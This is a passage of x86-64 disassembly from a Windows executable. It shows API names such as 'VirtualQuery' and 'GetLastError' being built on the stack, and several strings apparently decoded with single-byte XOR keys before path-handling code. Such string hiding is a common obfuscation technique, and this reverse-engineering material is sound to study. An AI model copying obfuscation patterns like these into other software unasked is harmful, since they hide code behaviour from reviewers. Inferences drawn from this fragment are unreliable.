   140004d28:	48 89 85 50 08 00 00 	mov    %rax,0x850(%rbp)
   140004d2f:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004d36:	48 b8 50 d7 b0 58 11 	movabs $0x720c4e1158b0d750,%rax
   140004d3d:	4e 0c 72 
   140004d40:	48 89 85 50 08 00 00 	mov    %rax,0x850(%rbp)
   140004d47:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004d4e:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140004d53:	e8 e8 4f 01 00       	call   0x140019d40
   140004d58:	48 85 c0             	test   %rax,%rax
   140004d5b:	0f 84 57 20 00 00    	je     0x140006db8
   140004d61:	48 b9 56 69 72 74 75 	movabs $0x516c617574726956,%rcx
   140004d68:	61 6c 51 
   140004d6b:	48 89 08             	mov    %rcx,(%rax)
   140004d6e:	c7 40 08 75 65 72 79 	movl   $0x79726575,0x8(%rax)
   140004d75:	48 c7 85 50 08 00 00 	movq   $0xc,0x850(%rbp)
   140004d7c:	0c 00 00 00 
   140004d80:	48 89 85 58 08 00 00 	mov    %rax,0x858(%rbp)
   140004d87:	48 c7 85 60 08 00 00 	movq   $0xc,0x860(%rbp)
   140004d8e:	0c 00 00 00 
   140004d92:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004d99:	48 83 bd 50 08 00 00 	cmpq   $0x0,0x850(%rbp)
   140004da0:	00 
   140004da1:	74 1b                	je     0x140004dbe
   140004da3:	48 8b b5 58 08 00 00 	mov    0x858(%rbp),%rsi
   140004daa:	ff 15 20 c5 01 00    	call   *0x1c520(%rip)        # 0x1400212d0
   140004db0:	48 89 c1             	mov    %rax,%rcx
   140004db3:	31 d2                	xor    %edx,%edx
   140004db5:	49 89 f0             	mov    %rsi,%r8
   140004db8:	ff 15 0a c5 01 00    	call   *0x1c50a(%rip)        # 0x1400212c8
   140004dbe:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140004dc3:	e8 78 4f 01 00       	call   0x140019d40
   140004dc8:	48 85 c0             	test   %rax,%rax
   140004dcb:	0f 84 e7 1f 00 00    	je     0x140006db8
   140004dd1:	48 b9 47 65 74 4c 61 	movabs $0x457473614c746547,%rcx
   140004dd8:	73 74 45 
   140004ddb:	48 89 08             	mov    %rcx,(%rax)
   140004dde:	c7 40 08 72 72 6f 72 	movl   $0x726f7272,0x8(%rax)
   140004de5:	48 c7 85 50 08 00 00 	movq   $0xc,0x850(%rbp)
   140004dec:	0c 00 00 00 
   140004df0:	48 89 85 58 08 00 00 	mov    %rax,0x858(%rbp)
   140004df7:	48 c7 85 60 08 00 00 	movq   $0xc,0x860(%rbp)
   140004dfe:	0c 00 00 00 
   140004e02:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004e09:	48 83 bd 50 08 00 00 	cmpq   $0x0,0x850(%rbp)
   140004e10:	00 
   140004e11:	74 1b                	je     0x140004e2e
   140004e13:	48 8b b5 58 08 00 00 	mov    0x858(%rbp),%rsi
   140004e1a:	ff 15 b0 c4 01 00    	call   *0x1c4b0(%rip)        # 0x1400212d0
   140004e20:	48 89 c1             	mov    %rax,%rcx
   140004e23:	31 d2                	xor    %edx,%edx
   140004e25:	49 89 f0             	mov    %rsi,%r8
   140004e28:	ff 15 9a c4 01 00    	call   *0x1c49a(%rip)        # 0x1400212c8
   140004e2e:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   140004e33:	e8 08 4f 01 00       	call   0x140019d40
   140004e38:	48 85 c0             	test   %rax,%rax
   140004e3b:	0f 84 d0 1f 00 00    	je     0x140006e11
   140004e41:	0f 28 05 58 c8 01 00 	movaps 0x1c858(%rip),%xmm0        # 0x1400216a0
   140004e48:	0f 11 00             	movups %xmm0,(%rax)
   140004e4b:	48 b9 41 70 70 6c 69 	movabs $0x746163696c707041,%rcx
   140004e52:	63 61 74 
   140004e55:	48 89 48 10          	mov    %rcx,0x10(%rax)
   140004e59:	66 c7 40 18 69 6f    	movw   $0x6f69,0x18(%rax)
   140004e5f:	c6 40 1a 6e          	movb   $0x6e,0x1a(%rax)
   140004e63:	48 c7 85 50 08 00 00 	movq   $0x1b,0x850(%rbp)
   140004e6a:	1b 00 00 00 
   140004e6e:	48 89 85 58 08 00 00 	mov    %rax,0x858(%rbp)
   140004e75:	48 c7 85 60 08 00 00 	movq   $0x1b,0x860(%rbp)
   140004e7c:	1b 00 00 00 
   140004e80:	48 8d 85 50 08 00 00 	lea    0x850(%rbp),%rax
   140004e87:	48 83 bd 50 08 00 00 	cmpq   $0x0,0x850(%rbp)
   140004e8e:	00 
   140004e8f:	74 1b                	je     0x140004eac
   140004e91:	48 8b b5 58 08 00 00 	mov    0x858(%rbp),%rsi
   140004e98:	ff 15 32 c4 01 00    	call   *0x1c432(%rip)        # 0x1400212d0
   140004e9e:	48 89 c1             	mov    %rax,%rcx
   140004ea1:	31 d2                	xor    %edx,%edx
   140004ea3:	49 89 f0             	mov    %rsi,%r8
   140004ea6:	ff 15 1c c4 01 00    	call   *0x1c41c(%rip)        # 0x1400212c8
   140004eac:	48 8d 0d 05 c9 01 00 	lea    0x1c905(%rip),%rcx        # 0x1400217b8
   140004eb3:	ba 0e 00 00 00       	mov    $0xe,%edx
   140004eb8:	41 b0 0a             	mov    $0xa,%r8b
   140004ebb:	e8 90 ce ff ff       	call   0x140001d50
   140004ec0:	48 89 c7             	mov    %rax,%rdi
   140004ec3:	48 8d 0d fc c8 01 00 	lea    0x1c8fc(%rip),%rcx        # 0x1400217c6
   140004eca:	ba 0b 00 00 00       	mov    $0xb,%edx
   140004ecf:	41 b0 e0             	mov    $0xe0,%r8b
   140004ed2:	e8 79 ce ff ff       	call   0x140001d50
   140004ed7:	48 89 c6             	mov    %rax,%rsi
   140004eda:	48 8d 0d f0 c8 01 00 	lea    0x1c8f0(%rip),%rcx        # 0x1400217d1
   140004ee1:	ba 0b 00 00 00       	mov    $0xb,%edx
   140004ee6:	41 b0 9e             	mov    $0x9e,%r8b
   140004ee9:	e8 62 ce ff ff       	call   0x140001d50
   140004eee:	48 85 ff             	test   %rdi,%rdi
   140004ef1:	0f 94 c2             	sete   %dl
   140004ef4:	48 85 f6             	test   %rsi,%rsi
   140004ef7:	0f 94 c1             	sete   %cl
   140004efa:	08 d1                	or     %dl,%cl
   140004efc:	0f 85 61 0a 00 00    	jne    0x140005963
   140004f02:	48 89 bd b8 0d 00 00 	mov    %rdi,0xdb8(%rbp)
   140004f09:	48 89 b5 f0 0c 00 00 	mov    %rsi,0xcf0(%rbp)
   140004f10:	48 89 85 e8 0c 00 00 	mov    %rax,0xce8(%rbp)
   140004f17:	48 c7 85 30 0d 00 00 	movq   $0x0,0xd30(%rbp)
   140004f1e:	00 00 00 00 
   140004f22:	48 c7 85 38 0d 00 00 	movq   $0x2,0xd38(%rbp)
   140004f29:	02 00 00 00 
   140004f2d:	48 c7 85 40 0d 00 00 	movq   $0x0,0xd40(%rbp)
   140004f34:	00 00 00 00 
   140004f38:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140004f3e:	b8 02 00 00 00       	mov    $0x2,%eax
   140004f43:	48 89 85 c0 0d 00 00 	mov    %rax,0xdc0(%rbp)
   140004f4a:	31 ff                	xor    %edi,%edi
   140004f4c:	31 db                	xor    %ebx,%ebx
   140004f4e:	45 31 f6             	xor    %r14d,%r14d
   140004f51:	49 81 f8 01 02 00 00 	cmp    $0x201,%r8
   140004f58:	72 15                	jb     0x140004f6f
   140004f5a:	eb 34                	jmp    0x140004f90
   140004f5c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004f60:	0f 83 04 01 00 00    	jae    0x14000506a
   140004f66:	49 81 f8 01 02 00 00 	cmp    $0x201,%r8
   140004f6d:	73 21                	jae    0x140004f90
   140004f6f:	41 bc 00 02 00 00    	mov    $0x200,%r12d
   140004f75:	4c 8d ad 50 08 00 00 	lea    0x850(%rbp),%r13
   140004f7c:	4c 89 c6             	mov    %r8,%rsi
   140004f7f:	eb 47                	jmp    0x140004fc8
   140004f81:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004f88:	0f 1f 84 00 00 00 00 
   140004f8f:	00 
   140004f90:	4d 29 f0             	sub    %r14,%r8
   140004f93:	4c 29 f3             	sub    %r14,%rbx
   140004f96:	49 39 d8             	cmp    %rbx,%r8
   140004f99:	0f 87 93 00 00 00    	ja     0x140005032
   140004f9f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004fa4:	48 39 c7             	cmp    %rax,%rdi
   140004fa7:	41 be ff ff ff ff    	mov    $0xffffffff,%r14d
   140004fad:	4c 0f 42 f7          	cmovb  %rdi,%r14
   140004fb1:	4c 89 b5 40 0d 00 00 	mov    %r14,0xd40(%rbp)
   140004fb8:	48 89 fb             	mov    %rdi,%rbx
   140004fbb:	4d 89 f4             	mov    %r14,%r12
   140004fbe:	4c 8b ad c0 0d 00 00 	mov    0xdc0(%rbp),%r13
   140004fc5:	4c 89 f6             	mov    %r14,%rsi
   140004fc8:	31 c9                	xor    %ecx,%ecx
   140004fca:	ff 15 a0 c2 01 00    	call   *0x1c2a0(%rip)        # 0x140021270
   140004fd0:	48 8b 05 a1 40 0e 00 	mov    0xe40a1(%rip),%rax        # 0x1400e9078
   140004fd7:	89 f1                	mov    %esi,%ecx
   140004fd9:	4c 89 ea             	mov    %r13,%rdx
   140004fdc:	ff d0                	call   *%rax
   140004fde:	41 89 c7             	mov    %eax,%r15d
   140004fe1:	85 c0                	test   %eax,%eax
   140004fe3:	75 0e                	jne    0x140004ff3
   140004fe5:	ff 15 7d c2 01 00    	call   *0x1c27d(%rip)        # 0x140021268
   140004feb:	85 c0                	test   %eax,%eax
   140004fed:	0f 85 be 00 00 00    	jne    0x1400050b1
   140004ff3:	45 89 f8             	mov    %r15d,%r8d
   140004ff6:	4c 39 c6             	cmp    %r8,%rsi
   140004ff9:	0f 85 61 ff ff ff    	jne    0x140004f60
   140004fff:	ff 15 63 c2 01 00    	call   *0x1c263(%rip)        # 0x140021268
   140005005:	83 f8 7a             	cmp    $0x7a,%eax
   140005008:	0f 85 c2 19 00 00    	jne    0x1400069d0
   14000500e:	48 01 f6             	add    %rsi,%rsi
   140005011:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005016:	48 39 c6             	cmp    %rax,%rsi
   140005019:	48 0f 43 f0          	cmovae %rax,%rsi
   14000501d:	49 89 f0             	mov    %rsi,%r8
   140005020:	49 81 f8 01 02 00 00 	cmp    $0x201,%r8
   140005027:	0f 83 63 ff ff ff    	jae    0x140004f90
   14000502d:	e9 3d ff ff ff       	jmp    0x140004f6f
   140005032:	48 c7 44 24 20 02 00 	movq   $0x2,0x20(%rsp)
   140005039:	00 00 
   14000503b:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140005041:	48 8d 8d 30 0d 00 00 	lea    0xd30(%rbp),%rcx
   140005048:	4c 89 f2             	mov    %r14,%rdx
   14000504b:	e8 00 b2 01 00       	call   0x140020250
   140005050:	48 8b bd 30 0d 00 00 	mov    0xd30(%rbp),%rdi
   140005057:	48 8b 85 38 0d 00 00 	mov    0xd38(%rbp),%rax
   14000505e:	48 89 85 c0 0d 00 00 	mov    %rax,0xdc0(%rbp)
   140005065:	e9 35 ff ff ff       	jmp    0x140004f9f
   14000506a:	4d 39 c4             	cmp    %r8,%r12
   14000506d:	0f 82 78 18 00 00    	jb     0x1400068eb
   140005073:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   14000507a:	4c 89 ea             	mov    %r13,%rdx
   14000507d:	e8 1e 53 00 00       	call   0x14000a3a0
   140005082:	48 8b bd d0 03 00 00 	mov    0x3d0(%rbp),%rdi
   140005089:	48 8b 85 d8 03 00 00 	mov    0x3d8(%rbp),%rax
   140005090:	48 89 85 20 0d 00 00 	mov    %rax,0xd20(%rbp)
   140005097:	48 8b 85 e0 03 00 00 	mov    0x3e0(%rbp),%rax
   14000509e:	48 89 85 d0 0d 00 00 	mov    %rax,0xdd0(%rbp)
   1400050a5:	48 83 bd 30 0d 00 00 	cmpq   $0x0,0xd30(%rbp)
   1400050ac:	00 
   1400050ad:	75 2f                	jne    0x1400050de
   1400050af:	eb 48                	jmp    0x1400050f9
   1400050b1:	ff 15 b1 c1 01 00    	call   *0x1c1b1(%rip)        # 0x140021268
   1400050b7:	48 c1 e0 20          	shl    $0x20,%rax
   1400050bb:	48 83 c8 02          	or     $0x2,%rax
   1400050bf:	48 89 85 20 0d 00 00 	mov    %rax,0xd20(%rbp)
   1400050c6:	48 83 bd 30 0d 00 00 	cmpq   $0x0,0xd30(%rbp)
   1400050cd:	00 
   1400050ce:	0f 84 96 1d 00 00    	je     0x140006e6a
   1400050d4:	48 bf 00 00 00 00 00 	movabs $0x8000000000000000,%rdi
   1400050db:	00 00 80 
   1400050de:	48 8b b5 38 0d 00 00 	mov    0xd38(%rbp),%rsi
   1400050e5:	ff 15 e5 c1 01 00    	call   *0x1c1e5(%rip)        # 0x1400212d0
   1400050eb:	48 89 c1             	mov    %rax,%rcx
   1400050ee:	31 d2                	xor    %edx,%edx
   1400050f0:	49 89 f0             	mov    %rsi,%r8
   1400050f3:	ff 15 cf c1 01 00    	call   *0x1c1cf(%rip)        # 0x1400212c8
   1400050f9:	48 89 f8             	mov    %rdi,%rax
   1400050fc:	48 f7 d8             	neg    %rax
   1400050ff:	0f 80 65 1d 00 00    	jo     0x140006e6a
   140005105:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000510a:	e8 31 4c 01 00       	call   0x140019d40
   14000510f:	48 85 c0             	test   %rax,%rax
   140005112:	0f 84 08 1d 00 00    	je     0x140006e20
   140005118:	48 89 c6             	mov    %rax,%rsi
   14000511b:	48 89 bd d0 0c 00 00 	mov    %rdi,0xcd0(%rbp)
   140005122:	0f 28 05 87 c5 01 00 	movaps 0x1c587(%rip),%xmm0        # 0x1400216b0
   140005129:	0f 11 00             	movups %xmm0,(%rax)
   14000512c:	48 89 85 70 0d 00 00 	mov    %rax,0xd70(%rbp)
   140005133:	48 c7 85 78 0d 00 00 	movq   $0x10,0xd78(%rbp)
   14000513a:	10 00 00 00 
   14000513e:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   140005145:	48 8d 95 70 0d 00 00 	lea    0xd70(%rbp),%rdx
   14000514c:	e8 ff 90 00 00       	call   0x14000e250
   140005151:	4c 8b b5 50 08 00 00 	mov    0x850(%rbp),%r14
   140005158:	4d 85 f6             	test   %r14,%r14
   14000515b:	0f 84 a1 01 00 00    	je     0x140005302
   140005161:	4c 8b a5 58 08 00 00 	mov    0x858(%rbp),%r12
   140005168:	48 83 bd 68 08 00 00 	cmpq   $0x0,0x868(%rbp)
   14000516f:	00 
   140005170:	48 89 b5 e8 0d 00 00 	mov    %rsi,0xde8(%rbp)
   140005177:	0f 84 9d 01 00 00    	je     0x14000531a
   14000517d:	bf 10 00 00 00       	mov    $0x10,%edi
   140005182:	b9 10 00 00 00       	mov    $0x10,%ecx
   140005187:	e8 b4 4b 01 00       	call   0x140019d40
   14000518c:	48 85 c0             	test   %rax,%rax
   14000518f:	0f 84 8b 1c 00 00    	je     0x140006e20
   140005195:	49 89 c5             	mov    %rax,%r13
   140005198:	48 c7 85 d0 03 00 00 	movq   $0x10,0x3d0(%rbp)
   14000519f:	10 00 00 00 
   1400051a3:	48 89 85 d8 03 00 00 	mov    %rax,0x3d8(%rbp)
   1400051aa:	48 c7 85 e0 03 00 00 	movq   $0x0,0x3e0(%rbp)
   1400051b1:	00 00 00 00 
   1400051b5:	49 83 fc 10          	cmp    $0x10,%r12
   1400051b9:	0f 87 45 17 00 00    	ja     0x140006904
   1400051bf:	31 f6                	xor    %esi,%esi
   1400051c1:	4a 8d 0c 2e          	lea    (%rsi,%r13,1),%rcx
   1400051c5:	4c 89 f2             	mov    %r14,%rdx
   1400051c8:	4d 89 e0             	mov    %r12,%r8
   1400051cb:	e8 41 aa 01 00       	call   0x14001fc11
   1400051d0:	4c 01 e6             	add    %r12,%rsi
   1400051d3:	48 89 b5 e0 03 00 00 	mov    %rsi,0x3e0(%rbp)
   1400051da:	48 29 f7             	sub    %rsi,%rdi
   1400051dd:	48 83 ff 02          	cmp    $0x2,%rdi
   1400051e1:	0f 86 48 17 00 00    	jbe    0x14000692f
   1400051e7:	41 c6 44 35 02 bd    	movb   $0xbd,0x2(%r13,%rsi,1)
   1400051ed:	66 41 c7 44 35 00 ef 	movw   $0xbfef,0x0(%r13,%rsi,1)
   1400051f4:	bf 
   1400051f5:	48 83 c6 03          	add    $0x3,%rsi
   1400051f9:	48 89 b5 e0 03 00 00 	mov    %rsi,0x3e0(%rbp)
   140005200:	0f 10 85 70 0d 00 00 	movups 0xd70(%rbp),%xmm0
   140005207:	0f 11 85 30 0d 00 00 	movups %xmm0,0xd30(%rbp)
   14000520e:	4c 8d b5 50 08 00 00 	lea    0x850(%rbp),%r14
   140005215:	4c 8d ad 30 0d 00 00 	lea    0xd30(%rbp),%r13
   14000521c:	49 89 f4             	mov    %rsi,%r12
   14000521f:	90                   	nop
   140005220:	4c 89 f1             	mov    %r14,%rcx
   140005223:	4c 89 ea             	mov    %r13,%rdx
   140005226:	e8 25 90 00 00       	call   0x14000e250
   14000522b:	48 8b b5 50 08 00 00 	mov    0x850(%rbp),%rsi
   140005232:	48 85 f6             	test   %rsi,%rsi
   140005235:	0f 84 af 00 00 00    	je     0x1400052ea
   14000523b:	4c 8b bd 58 08 00 00 	mov    0x858(%rbp),%r15
   140005242:	48 8b bd 68 08 00 00 	mov    0x868(%rbp),%rdi
   140005249:	48 8b 85 d0 03 00 00 	mov    0x3d0(%rbp),%rax
   140005250:	4c 29 e0             	sub    %r12,%rax
   140005253:	49 39 c7             	cmp    %rax,%r15
   140005256:	77 52                	ja     0x1400052aa
   140005258:	48 8b 9d d8 03 00 00 	mov    0x3d8(%rbp),%rbx
   14000525f:	4a 8d 0c 23          	lea    (%rbx,%r12,1),%rcx
   140005263:	48 89 f2             	mov    %rsi,%rdx
   140005266:	4d 89 f8             	mov    %r15,%r8
   140005269:	e8 a3 a9 01 00       	call   0x14001fc11
   14000526e:	4d 01 fc             	add    %r15,%r12
   140005271:	4c 89 a5 e0 03 00 00 	mov    %r12,0x3e0(%rbp)
   140005278:	48 85 ff             	test   %rdi,%rdi
   14000527b:	74 a3                	je     0x140005220
   14000527d:	48 8b 85 d0 03 00 00 	mov    0x3d0(%rbp),%rax
   140005284:	4c 29 e0             	sub    %r12,%rax
   140005287:	48 83 f8 02          	cmp    $0x2,%rax
   14000528b:	76 38                	jbe    0x1400052c5
   14000528d:	42 c6 44 23 02 bd    	movb   $0xbd,0x2(%rbx,%r12,1)
   140005293:	66 42 c7 04 23 ef bf 	movw   $0xbfef,(%rbx,%r12,1)
   14000529a:	49 83 c4 03          	add    $0x3,%r12
   14000529e:	4c 89 a5 e0 03 00 00 	mov    %r12,0x3e0(%rbp)
   1400052a5:	e9 76 ff ff ff       	jmp    0x140005220
   1400052aa:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   1400052b1:	4c 89 e2             	mov    %r12,%rdx
   1400052b4:	4d 89 f8             	mov    %r15,%r8
   1400052b7:	e8 b4 aa 01 00       	call   0x14001fd70
   1400052bc:	4c 8b a5 e0 03 00 00 	mov    0x3e0(%rbp),%r12
   1400052c3:	eb 93                	jmp    0x140005258
   1400052c5:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400052cb:	48 8d 8d d0 03 00 00 	lea    0x3d0(%rbp),%rcx
   1400052d2:	4c 89 e2             	mov    %r12,%rdx
   1400052d5:	e8 96 aa 01 00       	call   0x14001fd70
   1400052da:	48 8b 9d d8 03 00 00 	mov    0x3d8(%rbp),%rbx
   1400052e1:	4c 8b a5 e0 03 00 00 	mov    0x3e0(%rbp),%r12
   1400052e8:	eb a3                	jmp    0x14000528d
   1400052ea:	48 8b b5 d0 03 00 00 	mov    0x3d0(%rbp),%rsi
   1400052f1:	4c 8b b5 d8 03 00 00 	mov    0x3d8(%rbp),%r14
   1400052f8:	4d 85 e4             	test   %r12,%r12
   1400052fb:	79 2c                	jns    0x140005329
   1400052fd:	e8 6e ab 01 00       	call   0x14001fe70
   140005302:	c6 85 f8 0c 00 00 01 	movb   $0x1,0xcf8(%rbp)
   140005309:	b8 01 00 00 00       	mov    $0x1,%eax
   14000530e:	48 89 85 c0 0d 00 00 	mov    %rax,0xdc0(%rbp)
   140005315:	45 31 e4             	xor    %r12d,%r12d
   140005318:	eb 6f                	jmp    0x140005389
   14000531a:	48 be 00 00 00 00 00 	movabs $0x8000000000000000,%rsi
   140005321:	00 00 80 
   140005324:	4d 85 e4             	test   %r12,%r12
   140005327:	78 d4                	js     0x1400052fd
   140005329:	0f 94 85 f8 0c 00 00 	sete   0xcf8(%rbp)
   140005330:	74 1a                	je     0x14000534c
   140005332:	4c 89 e1             	mov    %r12,%rcx
   140005335:	e8 06 4a 01 00       	call   0x140019d40
   14000533a:	48 85 c0             	test   %rax,%rax
   14000533d:	75 12                	jne    0x140005351
   14000533f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005344:	4c 89 e2             	mov    %r12,%rdx
   140005347:	e8 0a aa 01 00       	call   0x14001fd56
   14000534c:	b8 01 00 00 00       	mov    $0x1,%eax
   140005351:	48 89 85 c0 0d 00 00 	mov    %rax,0xdc0(%rbp)
   140005358:	48 89 c1             	mov    %rax,%rcx
   14000535b:	4c 89 f2             	mov    %r14,%rdx
   14000535e:	4d 89 e0             	mov    %r12,%r8
   140005361:	e8 ab a8 01 00       	call   0x14001fc11
   140005366:	48 d1 e6             	shl    $1,%rsi
   140005369:	48 85 f6             	test   %rsi,%rsi
   14000536c:	74 14                	je     0x140005382
   14000536e:	ff 15 5c bf 01 00    	call   *0x1bf5c(%rip)        # 0x1400212d0
   140005374:	48 89 c1             	mov    %rax,%rcx
   140005377:	31 d2                	xor    %edx,%edx
   140005379:	4d 89 f0             	mov    %r14,%r8
   14000537c:	ff 15 46 bf 01 00    	call   *0x1bf46(%rip)        # 0x1400212c8
   140005382:	48 8b b5 e8 0d 00 00 	mov    0xde8(%rbp),%rsi
   140005389:	ff 15 41 bf 01 00    	call   *0x1bf41(%rip)        # 0x1400212d0
   14000538f:	48 89 c1             	mov    %rax,%rcx
   140005392:	31 d2                	xor    %edx,%edx
   140005394:	49 89 f0             	mov    %rsi,%r8
   140005397:	ff 15 2b bf 01 00    	call   *0x1bf2b(%rip)        # 0x1400212c8
   14000539d:	48 8b b5 d0 0d 00 00 	mov    0xdd0(%rbp),%rsi
   1400053a4:	48 85 f6             	test   %rsi,%rsi
   1400053a7:	0f 84 a7 00 00 00    	je     0x140005454
   1400053ad:	48 89 f1             	mov    %rsi,%rcx
   1400053b0:	e8 8b 49 01 00       	call   0x140019d40
   1400053b5:	48 85 c0             	test   %rax,%rax
   1400053b8:	0f 84 ea 1a 00 00    	je     0x140006ea8
   1400053be:	48 89 c7             	mov    %rax,%rdi
   1400053c1:	48 89 c1             	mov    %rax,%rcx
   1400053c4:	48 8b 95 20 0d 00 00 	mov    0xd20(%rbp),%rdx
   1400053cb:	49 89 f0             	mov    %rsi,%r8
   1400053ce:	e8 3e a8 01 00       	call   0x14001fc11
   1400053d3:	48 89 b5 90 0c 00 00 	mov    %rsi,0xc90(%rbp)
   1400053da:	48 89 bd 98 0c 00 00 	mov    %rdi,0xc98(%rbp)
   1400053e1:	48 89 b5 a0 0c 00 00 	mov    %rsi,0xca0(%rbp)
   1400053e8:	c6 85 a8 0c 00 00 00 	movb   $0x0,0xca8(%rbp)
   1400053ef:	8a 5c 37 ff          	mov    -0x1(%rdi,%rsi,1),%bl
   1400053f3:	48 8d 8d 50 08 00 00 	lea    0x850(%rbp),%rcx
   1400053fa:	48 89 bd e8 0d 00 00 	mov    %rdi,0xde8(%rbp)
   140005401:	48 89 fa             	mov    %rdi,%rdx
   140005404:	49 89 f0             	mov    %rsi,%r8
   140005407:	e8 64 2b 01 00       	call   0x140017f70
   14000540c:	80 fb 2f             	cmp    $0x2f,%bl
   14000540f:	40 0f 95 c6          	setne  %sil
   140005413:	80 fb 5c             	cmp    $0x5c,%bl
   140005416:	0f 95 c2             	setne  %dl
   140005419:	44 0f b6 ad 50 08 00 	movzbl 0x850(%rbp),%r13d
   140005420:	00 
   140005421:	41 0f b6 c5          	movzbl %r13b,%eax
   140005425:	48 8b 9d 60 08 00 00 	mov    0x860(%rbp),%rbx
   14000542c:	4c 8b b5 70 08 00 00 	mov    0x870(%rbp),%r14
   140005433:	48 8d 0d 3e eb 0d 00 	lea    0xdeb3e(%rip),%rcx        # 0x1400e3f78
   14000543a:	4c 63 0c 81          	movslq (%rcx,%rax,4),%r9
   14000543e:	49 01 c9             	add    %rcx,%r9
   140005441:	4c 8b 85 e8 0d 00 00 	mov    0xde8(%rbp),%r8
   140005448:	41 ff e1             	jmp    *%r9
   14000544b:	48 8d 4b 04          	lea    0x4(%rbx),%rcx
   14000544f:	e9 95 00 00 00       	jmp    0x1400054e9
   140005454:	b8 01 00 00 00       	mov    $0x1,%eax
   140005459:	48 89 85 e8 0d 00 00 	mov    %rax,0xde8(%rbp)
   140005460:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005465:	48 8b 95 20 0d 00 00 	mov    0xd20(%rbp),%rdx
   14000546c:	49 89 f0             	mov    %rsi,%r8
   14000546f:	e8 9d a7 01 00       	call   0x14001fc11
   140005474:	48 89 b5 90 0c 00 00 	mov    %rsi,0xc90(%rbp)
   14000547b:	48 c7 85 98 0c 00 00 	movq   $0x1,0xc98(%rbp)
   140005482:	01 00 00 00 
   140005486:	48 89 b5 a0 0c 00 00 	mov    %rsi,0xca0(%rbp)
   14000548d:	c6 85 a8 0c 00 00 00 	movb   $0x0,0xca8(%rbp)
   140005494:	48 8b 9d 60 08 00 00 	mov    0x860(%rbp),%rbx
   14000549b:	4c 8b bd 68 08 00 00 	mov    0x868(%rbp),%r15
   1400054a2:	4c 8b b5 70 08 00 00 	mov    0x870(%rbp),%r14
   1400054a9:	41 b5 06             	mov    $0x6,%r13b
   1400054ac:	31 ff                	xor    %edi,%edi
   1400054ae:	31 f6                	xor    %esi,%esi
   1400054b0:	e9 2f 01 00 00       	jmp    0x1400055e4
   1400054b5:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   1400054b9:	4d 85 f6             	test   %r14,%r14
   1400054bc:	49 0f 44 ce          	cmove  %r14,%rcx
   1400054c0:	48 01 d9             	add    %rbx,%rcx
   1400054c3:	48 83 c1 08          	add    $0x8,%rcx
   1400054c7:	eb 20                	jmp    0x1400054e9
   1400054c9:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400054ce:	eb 19                	jmp    0x1400054e9
   1400054d0:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   1400054d4:	4d 85 f6             	test   %r14,%r14
   1400054d7:	49 0f 44 ce          	cmove  %r14,%rcx
   1400054db:	48 01 d9             	add    %rbx,%rcx
   1400054de:	48 83 c1 02          	add    $0x2,%rcx
   1400054e2:	eb 05                	jmp    0x1400054e9
   1400054e4:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400054e9:	48 3b 8d d0 0d 00 00 	cmp    0xdd0(%rbp),%rcx
   1400054f0:	0f 87 61 14 00 00    	ja     0x140006957
   1400054f6:	75 04                	jne    0x1400054fc
   1400054f8:	31 ff                	xor    %edi,%edi
   1400054fa:	eb 1f                	jmp    0x14000551b
   1400054fc:	4c 8b 85 e8 0d 00 00 	mov    0xde8(%rbp),%r8
   140005503:	49 01 c8             	add    %rcx,%r8
   140005506:	41 0f b6 08          	movzbl (%r8),%ecx
   14000550a:	80 f9 2f             	cmp    $0x2f,%cl
   14000550d:	41 0f 94 c0          	sete   %r8b
   140005511:	80 f9 5c             	cmp    $0x5c,%cl
   140005514:	40 0f 94 c7          	sete   %dil
   140005518:	44 08 c7             	or     %r8b,%dil
   14000551b:	40 20 d6             	and    %dl,%sil
   14000551e:	48 8b 8d 51 08 00 00 	mov    0x851(%rbp),%rcx
   140005525:	48 8b 95 58 08 00 00 	mov    0x858(%rbp),%rdx
   14000552c:	48 89 95 47 08 00 00 	mov    %rdx,0x847(%rbp)
   140005533:	48 89 8d 40 08 00 00 	mov    %rcx,0x840(%rbp)
   14000553a:	4c 8b bd 68 08 00 00 	mov    0x868(%rbp),%r15
   140005541:	b9 06 00 00 00       	mov    $0x6,%ecx
   140005546:	89 c0                	mov    %eax,%eax
   140005548:	48 8d 15 45 ea 0d 00 	lea    0xdea45(%rip),%rdx        # 0x1400e3f94
   14000554f:	4c 63 04 82          	movslq (%rdx,%rax,4),%r8
   140005553:	49 01 d0             	add    %rdx,%r8
   140005556:	41 ff e0             	jmp    *%r8
   140005559:	48 8d 53 04          	lea    0x4(%rbx),%rdx
   14000555d:	eb 26                	jmp    0x140005585
   14000555f:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140005563:	4d 85 f6             	test   %r14,%r14
   140005566:	49 0f 44 d6          	cmove  %r14,%rdx
   14000556a:	48 01 da             	add    %rbx,%rdx
   14000556d:	48 83 c2 08          	add    $0x8,%rdx
   140005571:	eb 12                	jmp    0x140005585
   140005573:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140005577:	4d 85 f6             	test   %r14,%r14
   14000557a:	49 0f 44 d6          	cmove  %r14,%rdx
   14000557e:	48 01 da             	add    %rbx,%rdx
   140005581:	48 83 c2 02          	add    $0x2,%rdx
   140005585:	48 85 d2             	test   %rdx,%rdx
   140005588:	74 5a                	je     0x1400055e4
